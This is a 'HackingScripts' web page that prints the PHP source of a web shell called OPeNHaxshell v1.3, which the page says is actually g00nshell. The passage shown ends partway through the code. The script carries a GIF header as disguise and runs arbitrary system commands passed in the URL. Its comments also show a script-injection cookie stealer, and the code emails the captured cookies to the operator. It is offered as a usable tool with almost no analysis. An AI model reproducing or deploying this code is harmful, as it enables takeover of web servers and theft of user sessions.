<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> OPeNHaxshell Script </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>OPeNHaxshell Script</h2>
<p class="meta">09 Feb 2014</p>

<p>This OPeNHaxshell v1.3 script looks similar to the <a href="http://hackingscripts.com/c99-shell/" title="C99 shell">c99 shell</a>, and has been nicely commented (though not in detail in the body of the script).</p>

<p>UPDATE: This is actually just a g00nshell v1.3. How disappointing.</p>

<h3>OPeNHaxshell v1.3 final Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="lineno">  1</span> <span class="x">GIF89;a</span>
<span class="lineno">  2</span> <span class="x">666</span>
<span class="lineno">  3</span> <span class="cp">&lt;?php</span>
<span class="lineno">  4</span> <span class="cm">/*</span>
<span class="lineno">  5</span> 
<span class="lineno">  6</span> <span class="cm">###</span>
<span class="lineno">  7</span> <span class="cm">###</span>
<span class="lineno">  8</span> <span class="cm">###</span>
<span class="lineno">  9</span> <span class="cm">###</span>
<span class="lineno"> 10</span> <span class="cm">###</span>
<span class="lineno"> 11</span> <span class="cm">###</span>
<span class="lineno"> 12</span> <span class="cm">###</span>
<span class="lineno"> 13</span> <span class="cm">###</span>
<span class="lineno"> 14</span> <span class="cm">###</span>
<span class="lineno"> 15</span> <span class="cm">###</span>
<span class="lineno"> 16</span> <span class="cm">###</span>
<span class="lineno"> 17</span> <span class="cm">###</span>
<span class="lineno"> 18</span> <span class="cm">###</span>
<span class="lineno"> 19</span> <span class="cm">###</span>
<span class="lineno"> 20</span> <span class="cm">###</span>
<span class="lineno"> 21</span> <span class="cm">###</span>
<span class="lineno"> 22</span> <span class="cm">###</span>
<span class="lineno"> 23</span> <span class="cm">###</span>
<span class="lineno"> 24</span> <span class="cm">###</span>
<span class="lineno"> 25</span> <span class="cm">###</span>
<span class="lineno"> 26</span> <span class="cm">###</span>
<span class="lineno"> 27</span> <span class="cm">###</span>
<span class="lineno"> 28</span> <span class="cm">###</span>
<span class="lineno"> 29</span> <span class="cm">###</span>
<span class="lineno"> 30</span> <span class="cm">###</span>
<span class="lineno"> 31</span> <span class="cm">###</span>
<span class="lineno"> 32</span> <span class="cm">###</span>
<span class="lineno"> 33</span> <span class="cm">###</span>
<span class="lineno"> 34</span> <span class="cm">###</span>
<span class="lineno"> 35</span> <span class="cm">###</span>
<span class="lineno"> 36</span> <span class="cm">###</span>
<span class="lineno"> 37</span> <span class="cm">###</span>
<span class="lineno"> 38</span> <span class="cm">###</span>
<span class="lineno"> 39</span> <span class="cm">###</span>
<span class="lineno"> 40</span> <span class="cm">###</span>
<span class="lineno"> 41</span> <span class="cm">#                       [OPeNHax]Tn presents:                         #</span>
<span class="lineno"> 42</span> <span class="cm">#                       OPeNHaxshell v1.3 final                         #</span>
<span class="lineno"> 43</span> 
<span class="lineno"> 44</span> <span class="cm">###</span>
<span class="lineno"> 45</span> <span class="cm">###</span>
<span class="lineno"> 46</span> <span class="cm">###</span>
<span class="lineno"> 47</span> <span class="cm">###</span>
<span class="lineno"> 48</span> <span class="cm">###</span>
<span class="lineno"> 49</span> <span class="cm">###</span>
<span class="lineno"> 50</span> <span class="cm">###</span>
<span class="lineno"> 51</span> <span class="cm">###</span>
<span class="lineno"> 52</span> <span class="cm">###</span>
<span class="lineno"> 53</span> <span class="cm">###</span>
<span class="lineno"> 54</span> <span class="cm">###</span>
<span class="lineno"> 55</span> <span class="cm">###</span>
<span class="lineno"> 56</span> <span class="cm">###</span>
<span class="lineno"> 57</span> <span class="cm">###DOCUMENTATION</span>
<span class="lineno"> 58</span> <span class="cm">###</span>
<span class="lineno"> 59</span> <span class="cm">###</span>
<span class="lineno"> 60</span> <span class="cm">###</span>
<span class="lineno"> 61</span> <span class="cm">###</span>
<span class="lineno"> 62</span> <span class="cm">###</span>
<span class="lineno"> 63</span> <span class="cm">###</span>
<span class="lineno"> 64</span> <span class="cm">###</span>
<span class="lineno"> 65</span> <span class="cm">###</span>
<span class="lineno"> 66</span> <span class="cm">###</span>
<span class="lineno"> 67</span> <span class="cm">###</span>
<span class="lineno"> 68</span> <span class="cm">###</span>
<span class="lineno"> 69</span> <span class="cm">###</span>
<span class="lineno"> 70</span> <span class="cm">###</span>
<span class="lineno"> 71</span> <span class="cm">####</span>
<span class="lineno"> 72</span> <span class="cm">#To execute commands, simply include ?cmd=___ in the url.            #</span>
<span class="lineno"> 73</span> <span class="cm">#Ex: http://site.com/shl.php?cmd=whoami                              #</span>
<span class="lineno"> 74</span> <span class="cm">#                                                                    #</span>
<span class="lineno"> 75</span> <span class="cm">#To steal cookies, use ?cookie=___ in the url.                       #</span>
<span class="lineno"> 76</span> <span class="cm">#Ex: &lt;script&gt;document.location.href=                                 #</span>
<span class="lineno"> 77</span> <span class="cm">#&#39;http://site.com/shl.php?cookie=&#39;+document.cookies&lt;/script&gt;         #</span>
<span class="lineno"> 78</span> 
<span class="lineno"> 79</span> <span class="cm">###</span>
<span class="lineno"> 80</span> <span class="cm">###</span>
<span class="lineno"> 81</span> <span class="cm">###</span>
<span class="lineno"> 82</span> <span class="cm">###</span>
<span class="lineno"> 83</span> <span class="cm">###</span>
<span class="lineno"> 84</span> <span class="cm">###</span>
<span class="lineno"> 85</span> <span class="cm">###</span>
<span class="lineno"> 86</span> <span class="cm">###</span>
<span class="lineno"> 87</span> <span class="cm">###</span>
<span class="lineno"> 88</span> <span class="cm">###</span>
<span class="lineno"> 89</span> <span class="cm">###</span>
<span class="lineno"> 90</span> <span class="cm">###</span>
<span class="lineno"> 91</span> <span class="cm">###VERIFICATION LEVELS</span>
<span class="lineno"> 92</span> <span class="cm">###</span>
<span class="lineno"> 93</span> <span class="cm">###</span>
<span class="lineno"> 94</span> <span class="cm">###</span>
<span class="lineno"> 95</span> <span class="cm">###</span>
<span class="lineno"> 96</span> <span class="cm">###</span>
<span class="lineno"> 97</span> <span class="cm">###</span>
<span class="lineno"> 98</span> <span class="cm">###</span>
<span class="lineno"> 99</span> <span class="cm">###</span>
<span class="lineno">100</span> <span class="cm">###</span>
<span class="lineno">101</span> <span class="cm">###</span>
<span class="lineno">102</span> <span class="cm">###</span>
<span class="lineno">103</span> <span class="cm">####</span>
<span class="lineno">104</span> <span class="cm">#0: No protection; anyone can access                                 #</span>
<span class="lineno">105</span> <span class="cm">#1: User-Agent required                                              #</span>
<span class="lineno">106</span> <span class="cm">#2: Require IP                                                       #</span>
<span class="lineno">107</span> <span class="cm">#3: Basic Authentication                                             #</span>
<span class="lineno">108</span> 
<span class="lineno">109</span> <span class="cm">###</span>
<span class="lineno">110</span> <span class="cm">###</span>
<span class="lineno">111</span> <span class="cm">###</span>
<span class="lineno">112</span> <span class="cm">###</span>
<span class="lineno">113</span> <span class="cm">###</span>
<span class="lineno">114</span> <span class="cm">###</span>
<span class="lineno">115</span> <span class="cm">###</span>
<span class="lineno">116</span> <span class="cm">###</span>
<span class="lineno">117</span> <span class="cm">###</span>
<span class="lineno">118</span> <span class="cm">###</span>
<span class="lineno">119</span> <span class="cm">###</span>
<span class="lineno">120</span> <span class="cm">###</span>
<span class="lineno">121</span> <span class="cm">###</span>
<span class="lineno">122</span> <span class="cm">###</span>
<span class="lineno">123</span> <span class="cm">###KNOWN BUGS</span>
<span class="lineno">124</span> <span class="cm">###</span>
<span class="lineno">125</span> <span class="cm">###</span>
<span class="lineno">126</span> <span class="cm">###</span>
<span class="lineno">127</span> <span class="cm">###</span>
<span class="lineno">128</span> <span class="cm">###</span>
<span class="lineno">129</span> <span class="cm">###</span>
<span class="lineno">130</span> <span class="cm">###</span>
<span class="lineno">131</span> <span class="cm">###</span>
<span class="lineno">132</span> <span class="cm">###</span>
<span class="lineno">133</span> <span class="cm">###</span>
<span class="lineno">134</span> <span class="cm">###</span>
<span class="lineno">135</span> <span class="cm">###</span>
<span class="lineno">136</span> <span class="cm">###</span>
<span class="lineno">137</span> <span class="cm">###</span>
<span class="lineno">138</span> <span class="cm">###</span>
<span class="lineno">139</span> <span class="cm">#Windows directory handling                                          #</span>
<span class="lineno">140</span> <span class="cm">#                                                                    #</span>
<span class="lineno">141</span> <span class="cm">#The SQL tool is NOT complete. There is currently no editing function#</span>
<span class="lineno">142</span> <span class="cm">#available. Some time in the future this may be fixed, but for now   #</span>
<span class="lineno">143</span> <span class="cm">#don&#39;t complain to me about it                                       #</span>
<span class="lineno">144</span> 
<span class="lineno">145</span> <span class="cm">###</span>
<span class="lineno">146</span> <span class="cm">###</span>
<span class="lineno">147</span> <span class="cm">###</span>
<span class="lineno">148</span> <span class="cm">###</span>
<span class="lineno">149</span> <span class="cm">###</span>
<span class="lineno">150</span> <span class="cm">###</span>
<span class="lineno">151</span> <span class="cm">###</span>
<span class="lineno">152</span> <span class="cm">###</span>
<span class="lineno">153</span> <span class="cm">###</span>
<span class="lineno">154</span> <span class="cm">###</span>
<span class="lineno">155</span> <span class="cm">###</span>
<span class="lineno">156</span> <span class="cm">###</span>
<span class="lineno">157</span> <span class="cm">###</span>
<span class="lineno">158</span> <span class="cm">###</span>
<span class="lineno">159</span> <span class="cm">###</span>
<span class="lineno">160</span> <span class="cm">###SHOUTS</span>
<span class="lineno">161</span> <span class="cm">###</span>
<span class="lineno">162</span> <span class="cm">###</span>
<span class="lineno">163</span> <span class="cm">###</span>
<span class="lineno">164</span> <span class="cm">###</span>
<span class="lineno">165</span> <span class="cm">###</span>
<span class="lineno">166</span> <span class="cm">###</span>
<span class="lineno">167</span> <span class="cm">###</span>
<span class="lineno">168</span> <span class="cm">###</span>
<span class="lineno">169</span> <span class="cm">###</span>
<span class="lineno">170</span> <span class="cm">###</span>
<span class="lineno">171</span> <span class="cm">###</span>
<span class="lineno">172</span> <span class="cm">###</span>
<span class="lineno">173</span> <span class="cm">###</span>
<span class="lineno">174</span> <span class="cm">###</span>
<span class="lineno">175</span> <span class="cm">###</span>
<span class="lineno">176</span> <span class="cm">###</span>
<span class="lineno">177</span> <span class="cm">#pr0be - Beta testing  &amp; CSS                                         #</span>
<span class="lineno">178</span> <span class="cm">#TrinTiTTY - Beta testing                                            #</span>
<span class="lineno">179</span> <span class="cm">#clorox - Beta testing                                               #</span>
<span class="lineno">180</span> <span class="cm">#Everyone else at g00ns.net                                          #</span>
<span class="lineno">181</span> 
<span class="lineno">182</span> <span class="cm">###</span>
<span class="lineno">183</span> <span class="cm">###</span>
<span class="lineno">184</span> <span class="cm">###</span>
<span class="lineno">185</span> <span class="cm">###</span>
<span class="lineno">186</span> <span class="cm">###</span>
<span class="lineno">187</span> <span class="cm">###</span>
<span class="lineno">188</span> <span class="cm">###</span>
<span class="lineno">189</span> <span class="cm">###</span>
<span class="lineno">190</span> <span class="cm">###</span>
<span class="lineno">191</span> <span class="cm">###</span>
<span class="lineno">192</span> <span class="cm">###</span>
<span class="lineno">193</span> <span class="cm">###NOTE TO ADMINISTRATORS</span>
<span class="lineno">194</span> <span class="cm">###</span>
<span class="lineno">195</span> <span class="cm">###</span>
<span class="lineno">196</span> <span class="cm">###</span>
<span class="lineno">197</span> <span class="cm">###</span>
<span class="lineno">198</span> <span class="cm">###</span>
<span class="lineno">199</span> <span class="cm">###</span>
<span class="lineno">200</span> <span class="cm">###</span>
<span class="lineno">201</span> <span class="cm">###</span>
<span class="lineno">202</span> <span class="cm">###</span>
<span class="lineno">203</span> <span class="cm">###</span>
<span class="lineno">204</span> <span class="cm">###</span>
<span class="lineno">205</span> <span class="cm">###</span>
<span class="lineno">206</span> <span class="cm">#If this script has been found on your server without your approval, #</span>
<span class="lineno">207</span> <span class="cm">#it would probably be wise to delete it and check your logs.         #</span>
<span class="lineno">208</span> 
<span class="lineno">209</span> <span class="cm">###</span>
<span class="lineno">210</span> <span class="cm">###</span>
<span class="lineno">211</span> <span class="cm">###</span>
<span class="lineno">212</span> <span class="cm">###</span>
<span class="lineno">213</span> <span class="cm">###</span>
<span class="lineno">214</span> <span class="cm">###</span>
<span class="lineno">215</span> <span class="cm">###</span>
<span class="lineno">216</span> <span class="cm">###</span>
<span class="lineno">217</span> <span class="cm">###</span>
<span class="lineno">218</span> <span class="cm">###</span>
<span class="lineno">219</span> <span class="cm">###</span>
<span class="lineno">220</span> <span class="cm">###</span>
<span class="lineno">221</span> <span class="cm">###</span>
<span class="lineno">222</span> <span class="cm">###</span>
<span class="lineno">223</span> <span class="cm">###</span>
<span class="lineno">224</span> <span class="cm">###</span>
<span class="lineno">225</span> <span class="cm">###</span>
<span class="lineno">226</span> <span class="cm">###</span>
<span class="lineno">227</span> <span class="cm">###</span>
<span class="lineno">228</span> <span class="cm">###</span>
<span class="lineno">229</span> <span class="cm">###</span>
<span class="lineno">230</span> <span class="cm">###</span>
<span class="lineno">231</span> <span class="cm">###</span>
<span class="lineno">232</span> <span class="cm">###</span>
<span class="lineno">233</span> <span class="cm">###</span>
<span class="lineno">234</span> <span class="cm">###</span>
<span class="lineno">235</span> <span class="cm">###</span>
<span class="lineno">236</span> <span class="cm">###</span>
<span class="lineno">237</span> <span class="cm">###</span>
<span class="lineno">238</span> <span class="cm">###</span>
<span class="lineno">239</span> <span class="cm">###</span>
<span class="lineno">240</span> <span class="cm">###</span>
<span class="lineno">241</span> <span class="cm">###</span>
<span class="lineno">242</span> <span class="cm">###</span>
<span class="lineno">243</span> <span class="cm">###</span>
<span class="lineno">244</span> <span class="cm">*/</span>
<span class="lineno">245</span> <span class="c1">// Configuration</span>
<span class="lineno">246</span> <span class="nv">$auth</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">247</span> <span class="nv">$uakey</span> <span class="o">=</span> <span class="s2">&quot;b5c3d0b28619de70bf5588505f4061f2&quot;</span><span class="p">;</span> <span class="c1">// MD5 encoded user-agent</span>
<span class="lineno">248</span> <span class="nv">$IP</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;127.0.0.2&quot;</span><span class="p">,</span><span class="s2">&quot;127.0.0.1&quot;</span><span class="p">);</span> <span class="c1">// IP Addresses allowed to access shell</span>
<span class="lineno">249</span> <span class="nv">$email</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="c1">// E-mail address where cookies will be sent</span>
<span class="lineno">250</span> <span class="nv">$user</span>  <span class="o">=</span> <span class="s2">&quot;af1035a85447f5aa9d21570d884b723a&quot;</span><span class="p">;</span> <span class="c1">// MD5 encoded User</span>
<span class="lineno">251</span> <span class="nv">$pass</span> <span class="o">=</span> <span class="s2">&quot;47e331d2b8d07465515c50cb0fad1e5a&quot;</span><span class="p">;</span> <span class="c1">// MD5 encoded Password</span>
<span class="lineno">252</span> <span class="c1">// Global Variables</span>
<span class="lineno">253</span> <span class="nv">$version</span> <span class="o">=</span> <span class="s2">&quot;1.3 final&quot;</span><span class="p">;</span>
<span class="lineno">254</span> <span class="nv">$self</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span>
<span class="lineno">255</span> <span class="nv">$soft</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;SERVER_SOFTWARE&quot;</span><span class="p">];</span>
<span class="lineno">256</span> <span class="nv">$servinf</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="s2">&quot;[:]&quot;</span><span class="p">,</span> <span class="nb">getenv</span><span class="p">(</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">));</span>
<span class="lineno">257</span> <span class="nv">$servip</span> <span class="o">=</span> <span class="nv">$servinf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">258</span> <span class="nv">$servport</span> <span class="o">=</span> <span class="nv">$servinf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="lineno">259</span> <span class="nv">$uname</span> <span class="o">=</span> <span class="nb">php_uname</span><span class="p">();</span>
<span class="lineno">260</span> <span class="nv">$curuser</span> <span class="o">=</span> <span class="o">@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
<span class="lineno">261</span> <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
<span class="lineno">262</span> <span class="nv">$act</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">];</span>
<span class="lineno">263</span> <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
<span class="lineno">264</span> <span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cookie&#39;</span><span class="p">];</span>
<span class="lineno">265</span> <span class="nv">$f</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
<span class="lineno">266</span> <span class="nv">$curdir</span> <span class="o">=</span> <span class="nx">cleandir</span><span class="p">(</span><span class="nb">getcwd</span><span class="p">());</span>
<span class="lineno">267</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$dir</span><span class="p">){</span><span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">];}</span>
<span class="lineno">268</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">]){</span><span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">];}</span>
<span class="lineno">269</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">]){</span><span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$curdir</span><span class="p">;}</span>
<span class="lineno">270</span> <span class="k">if</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">&amp;&amp;</span> <span class="nv">$dir</span> <span class="o">!=</span> <span class="s2">&quot;nullz&quot;</span><span class="p">){</span><span class="nv">$dir</span> <span class="o">=</span> <span class="nx">cleandir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);}</span>
<span class="lineno">271</span> <span class="nv">$contents</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contents&#39;</span><span class="p">];</span>
<span class="lineno">272</span> <span class="nv">$gf</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;gf&#39;</span><span class="p">];</span>
<span class="lineno">273</span> <span class="nv">$img</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;img&#39;</span><span class="p">];</span>
<span class="lineno">274</span> <span class="nb">session_start</span><span class="p">();</span>
<span class="lineno">275</span> <span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
<span class="lineno">276</span> <span class="k">switch</span><span class="p">(</span><span class="nv">$auth</span><span class="p">){</span> <span class="c1">// Authentication switcher</span>
<span class="lineno">277</span>   <span class="k">case</span> <span class="mi">0</span><span class="o">:</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">278</span>   <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> <span class="k">if</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">])</span> <span class="o">!=</span> <span class="nv">$uakey</span><span class="p">){</span><span class="nx">hide</span><span class="p">();}</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">279</span>   <span class="k">case</span> <span class="mi">2</span><span class="o">:</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">],</span><span class="nv">$IP</span><span class="p">)){</span><span class="nx">hide</span><span class="p">();}</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">280</span>   <span class="k">case</span> <span class="mi">3</span><span class="o">:</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_AUTH_USER&quot;</span><span class="p">]){</span><span class="nx">userauth</span><span class="p">();}</span> <span class="k">break</span><span class="p">;</span>
<span class="lineno">281</span> <span class="p">}</span>
<span class="lineno">282</span>     
<span class="lineno">283</span> <span class="k">function</span> <span class="nf">userauth</span><span class="p">(){</span> <span class="c1">// Basic authentication function</span>
<span class="lineno">284</span>   <span class="k">global</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">;</span>
<span class="lineno">285</span>   <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;WWW-Authenticate: Basic realm=&#39;Secure Area&#39;&quot;</span><span class="p">);</span>
<span class="lineno">286</span>   <span class="k">if</span><span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_AUTH_USER&quot;</span><span class="p">])</span> <span class="o">!=</span> <span class="nv">$user</span> <span class="o">||</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_AUTH_PW&quot;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$pass</span><span class="p">)){</span>
<span class="lineno">287</span>     <span class="nx">hide</span><span class="p">();</span>
<span class="lineno">288</span>     <span class="k">die</span><span class="p">();</span>
<span class="lineno">289</span>   <span class="p">}</span>
<span class="lineno">290</span> <span class="p">}</span>
<span class="lineno">291</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$act</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$cmd</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$cookie</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$f</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$dir</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$gf</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$img</span><span class="p">){</span><span class="nx">main</span><span class="p">();}</span>
<span class="lineno">292</span> <span class="k">elseif</span><span class="p">(</span><span class="o">!</span><span class="nv">$act</span> <span class="o">&amp;&amp;</span> <span class="nv">$cmd</span><span class="p">){</span>
<span class="lineno">293</span>   <span class="nx">style</span><span class="p">();</span>
<span class="lineno">294</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;b&gt;Results:&lt;/b&gt;</span><span class="se">\n</span><span class="s2">&lt;br&gt;&lt;textarea rows=20 cols=100&gt;&quot;</span><span class="p">);</span>
<span class="lineno">295</span>   <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span> <span class="nv">$result</span><span class="p">);</span>
<span class="lineno">296</span>   <span class="k">foreach</span><span class="p">(</span><span class="nv">$result</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="nv">$line</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
<span class="lineno">297</span>   <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&lt;/textarea&gt;&quot;</span><span class="p">);</span>
<span class="lineno">298</span> <span class="p">}</span>
<span class="lineno">299</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">){</span><span class="o">@</span><span class="nb">mail</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$email</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;Cookie Data&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">$cookie</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;From: </span><span class="si">$email</span><span class="s2">&quot;</span><span class="p">);</span> <span class="nx">hide</span><span class="p">();}</span> <span class="c1">// Cookie stealer function</span>
<span class="lineno">300</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;view&quot;</span> <span class="o">&amp;&amp;</span> <span class="nv">$f</span> <span class="o">&amp;&amp;</span> <span class="nv">$dir</span><span class="p">){</span><span class="nx">view</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$dir</span><span class="p">);}</span>
<span class="lineno">301</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$img</span><span class="p">){</span><span class="nx">img</span><span class="p">(</span><span class="nv">$img</span><span class="p">);}</span>
<span class="lineno">302</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$gf</span><span class="p">){</span><span class="nx">grab</span><span class="p">(</span><span class="nv">$gf</span><span class="p">);}</span>
<span class="lineno">303</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$dir</span><span class="p">){</span><span class="nx">files</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);}</span>
<span class="lineno">304</span> <span class="k">else</span><span class="p">{</span>
<span class="lineno">305</span>   <span class="k">switch</span><span class="p">(</span><span class="nv">$act</span><span class="p">){</span>
<span class="lineno">306</span>     <span class="k">case</span> <span class="s2">&quot;phpinfo&quot;</span><span class="o">:</span> <span class="nb">phpinfo</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">307</span>     <span class="k">case</span> <span class="s2">&quot;sql&quot;</span><span class="o">:</span> <span class="nx">sql</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">308</span>     <span class="k">case</span> <span class="s2">&quot;files&quot;</span><span class="o">:</span> <span class="nx">files</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">309</span>     <span class="k">case</span> <span class="s2">&quot;email&quot;</span><span class="o">:</span> <span class="nx">email</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">310</span>     <span class="k">case</span> <span class="s2">&quot;cmd&quot;</span><span class="o">:</span> <span class="nx">cmd</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">311</span>     <span class="k">case</span> <span class="s2">&quot;upload&quot;</span><span class="o">:</span> <span class="nx">upload</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">312</span>     <span class="k">case</span> <span class="s2">&quot;tools&quot;</span><span class="o">:</span> <span class="nx">tools</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">313</span>     <span class="k">case</span> <span class="s2">&quot;sqllogin&quot;</span><span class="o">:</span> <span class="nx">sqllogin</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">314</span>     <span class="k">case</span> <span class="s2">&quot;sql&quot;</span><span class="o">:</span> <span class="nx">sql</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">315</span>     <span class="k">case</span> <span class="s2">&quot;lookup&quot;</span><span class="o">:</span> <span class="nx">lookup</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">316</span>     <span class="k">case</span> <span class="s2">&quot;kill&quot;</span><span class="o">:</span> <span class="nx">kill</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">317</span>     <span class="k">case</span> <span class="s2">&quot;phpexec&quot;</span><span class="o">:</span> <span class="nx">execphp</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">318</span>     <span class="k">default</span><span class="o">:</span> <span class="nx">main</span><span class="p">();</span><span class="k">break</span><span class="p">;</span>
<span class="lineno">319</span>   <span class="p">}</span>
<span class="lineno">320</span> <span class="p">}</span>
<span class="lineno">321</span> <span class="k">function</span> <span class="nf">cleandir</span><span class="p">(</span><span class="nv">$d</span><span class="p">){</span> <span class="c1">// Function to clean up the $dir and $curdir variables</span>
<span class="lineno">322</span>   <span class="nv">$d</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno">323</span>   <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;//&quot;</span><span class="p">,</span> <span class="nv">$d</span><span class="p">);</span>
